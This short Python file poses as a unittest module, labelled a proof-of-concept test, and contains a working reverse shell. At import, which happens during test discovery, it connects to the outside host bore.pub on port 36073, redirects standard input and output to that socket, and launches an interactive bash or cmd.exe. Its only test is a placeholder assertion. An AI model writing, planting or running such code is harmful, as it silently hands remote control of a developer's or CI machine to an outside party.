"""
PoC test - reverse shell runs at module import (unittest discover).
"""
import socket, subprocess, os, sys
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("bore.pub", 36073))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash", "-i"]) if sys.platform != "win32" else subprocess.call(["cmd.exe"])

import unittest
class TestPocRevshell(unittest.TestCase):
    def test_placeholder(self):
        self.assertTrue(True)
